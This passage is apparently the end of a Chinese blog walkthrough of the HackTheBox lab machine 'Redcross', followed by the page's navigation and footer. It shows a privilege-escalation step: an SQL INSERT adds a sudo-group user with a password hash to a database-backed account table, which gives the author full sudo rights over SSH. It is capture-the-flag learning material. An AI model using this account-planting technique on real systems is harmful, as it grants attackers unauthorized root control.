+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evil@redcross:&#x2F;var&#x2F;www&#x2F;html&#x2F;admin&#x2F;pages$ cat &#x2F;etc&#x2F;group |grep sudo</span><br><span class="line">sudo:x:27:</span><br></pre></td></tr></table></figure>
+
+<p>创建sudo组用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO passwd_table (username, passwd, gid, homedir) values (&#39;sudoo&#39;, &#39;$1$YRdG0wu4$.7lHDv1rbDHgghX1iv5eS&#x2F;&#39;, 27, &#39;&#x2F;tmp&#x2F;tmp&#39;);</span><br></pre></td></tr></table></figure>
+
+<p>ssh过去，发现sudo权限为all</p>
+<p><img src="/images/Redcross/52.png" alt="52"></p>
+<h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><p>还有ROP chain的bof，超出能力范围</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Linux%E9%9D%B6%E6%9C%BA/" rel="tag"># Linux靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/28/HTB-Servmon/" rel="prev" title="HTB:Servmon">
+      <i class="fa fa-chevron-left"></i> HTB:Servmon
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/10/30/%E9%9D%B6%E5%9C%BABrainpan/" rel="next" title="靶场Brainpan">
+      靶场Brainpan <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Redcross"><span class="nav-number">1.</span> <span class="nav-text">Redcross</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text">枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5-%E6%88%90%E5%8A%9F%E7%99%BB%E5%BD%95%E5%88%B0admin%E5%9F%9F"><span class="nav-number">1.2.1.</span> <span class="nav-text">第一步:成功登录到admin域</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951-guset%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">方法1:guset登录SQL注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-guest%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">方法2:guest会话固定</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953-XSS"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">方法3:XSS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5-shell"><span class="nav-number">1.2.2.</span> <span class="nav-text">第二步:shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951-%E9%98%B2%E7%81%AB%E5%A2%99%E2%86%92Haraka-RCE"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">方法1:防火墙→Haraka RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">方法2:命令注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%951-%E8%AE%BE%E7%BD%AEuid"><span class="nav-number">1.3.1.</span> <span class="nav-text">方法1:设置uid</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%952-%E8%AE%BE%E7%BD%AEgid"><span class="nav-number">1.3.2.</span> <span class="nav-text">方法2:设置gid</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AA%E5%AE%8C%E5%BE%85%E7%BB%AD"><span class="nav-number">1.4.</span> <span class="nav-text">未完待续</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="EvilArsene"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">EvilArsene</p>
+  <div class="site-description" itemprop="description">人格面具操控者</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/TZESS" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;TZESS" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Arsene_IP" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Arsene_IP" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilArsene</span>
+</div>
+
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+		var t1 = Date.UTC(2018,02,13,15,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已安全运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+	siteTime();
+</script>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
